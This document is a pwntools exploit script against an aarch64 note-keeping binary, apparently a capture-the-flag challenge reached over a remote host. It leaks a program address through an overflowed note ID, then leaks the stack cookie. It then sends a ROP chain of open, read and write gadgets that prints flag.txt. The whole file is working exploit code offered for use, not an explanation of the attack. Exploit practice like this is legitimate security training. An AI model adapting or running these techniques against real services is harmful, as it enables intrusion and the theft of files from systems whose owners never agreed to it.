from pwn import *
# QEMU_LD_PREFIX=/usr/aarch64-linux-gnu/
pwnlib.qemu.archname(arch='aarch64')
context.arch = 'aarch64'
elf = ELF("./note_keeper_arm")
# elf = ELF("./note_keeper_arm")
p = remote("chal.pctf.competitivecyber.club",5001)
# p = process("./note_keeper_arm")
# p = process("./docker_copy")
# p = process("./note_keeper_arm")
# p = gdb.debug("./docker_copy",
#               """
#               b voice_test
#               c
#               """)

p.sendline(b"1") # Create note
p.sendline(b"16711935") # Overflow note id
p.sendline(b"123") # Invalid length
print(p.clean())
p.sendline(b"2") # View for leak
p.recvuntil(b"Note:")
p.recvline()
leak = p.recvuntil(b"Note taker menu")
exit_addr = u64(leak[100:108])
print("got exit function address {}".format(hex(exit_addr)))

# Stage the leak
elf.address = exit_addr - elf.symbols["exit_program"]
print("Program is based at {}".format(hex(elf.address)))

open_addr = elf.symbols["open"]
write_addr = elf.symbols["write"]
read_addr = elf.symbols["read"]
note_read_addr = elf.symbols["read_note"]

print(p.recv())
p.sendline(b"1")
print(p.recv())
p.sendline(b"16711935") # Same noteID to skip len check

offset = 100
buf = b""
buf += b"A"*offset
buf += p64(elf.symbols["voice_note"])
buf += b"C"*8
print("Sending buffer")
p.sendline(buf)

print(p.clean())
p.sendline(b"4")
p.recvuntil(b"transcript:\n")
stack_leak = p.recvuntil(b"Note taker menu:")
stack_cookie = u64(stack_leak[100:108])
print("Got stack cookie : {}".format(hex(stack_cookie)))

p.clean()
flag_name_addr = elf.symbols["global_obj"] + 4
flag_buffer_space = flag_name_addr

p.sendline(b"1")
print(p.recv())
p.sendline(b"33489151") # Same noteID to skip len check
offset = 100
buf = b"flag.txt\x00"
buf += b"A"*(offset - 9)
buf += p64(elf.symbols["robot_voice_note"])
buf += p64(stack_cookie)
buf += p64(0x4343434343434343) # junk
buf += p64(elf.symbols["voice_test"])
buf += p64(0x4444444444444444) # junk
buf += p64(0x4444444444444445) # junk
buf += p64(flag_name_addr) # x0
buf += p64(elf.symbols["male_voice_test"])
buf += p64(0) # x1 # #define O_RDONLY        00000000
'''
This value will change based on compiler.
Pull it from the live docker container
'''
# bl_open = elf.address + 0xef4 # bl sym.open
bl_open = elf.address + 0xed8 # bl sym.open
buf += p64(bl_open)
buf += p64(0x4444444444444448) # JUNK
buf += p64(elf.symbols["voice_test"])
buf += p64(0x4545454545454545) # JUNK
buf += p64(0x4545454545454546) # JUNK
# GDB wants this to be 5
# But real binary does 3 
buf += p64(0x3) # x0 fd
buf += p64(elf.symbols["male_voice_test"])
buf += p64(flag_buffer_space) # x1 addr +100 to get around memset
buf += p64(elf.symbols["female_voice_test"])
buf += p64(99) # x2 read length
'''
This value will change based on compiler.
Pull it from the live docker container
'''
# bl_read = elf.address + 0xea0 # bl sym.read
bl_read = elf.address + 0xe84 # bl sym.read
buf += p64(bl_read)
buf += p64(0x4545454545454545) # JUNK
buf += p64(elf.symbols["voice_test"]) # Next addr
buf += p64(0x4545454545454547) # JUNK
buf += p64(stack_cookie) # JUNK
buf += p64(0x1) # x0 STDOUT
buf += p64(elf.symbols["male_voice_test"])
buf += p64(flag_buffer_space) # x1 addr
buf += p64(elf.symbols["female_voice_test"])
buf += p64(99) # x0 STDOUT
'''
This value will change based on compiler.
Pull it from the live docker container
'''
# bl_write = elf.address + 0xf34
bl_write = elf.address + 0xf14
buf += p64(bl_write) # Next addr
buf += p64(0x4545454545454541) # JUNK
buf += p64(elf.symbols["exit"]) # JUNK

print("Sending buffer")
p.sendline(buf)
# time.sleep(1)
print(p.recv())
time.sleep(1)
p.sendline(b"4") # Get PC overwrite
p.sendline(b"5") # Execute ROP chain
print(p.recv())
# print(p.recv())

# IPython.embed()
p.interactive()
